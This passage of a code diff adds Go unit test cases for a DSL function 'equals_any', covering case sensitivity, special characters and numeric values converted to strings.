+			`equals_any("TEST", "test", "Test", "TEST")`: true,
+			`equals_any("test", "TEST", "Test")`:         false,
+
+			// Special characters tests
+			`equals_any("test.com", "test.com", "test-com")`: true,
+			`equals_any("test-com", "test.com", "test_com")`: false,
+			`equals_any("test@123", "test@123", "test123")`:  true,
+
+			// Numeric value tests (converted to string)
+			`equals_any("123", "123", "456", "789")`: true,
+			`equals_any("123", 123, "456", "789")`:   true,
+			`equals_any(123, "123", "456", "789")`:   true,
+			`equals_any("123", "456", "789")`:        false,
+		}
+		testDslExpressions(t, tests)
+	})
 }
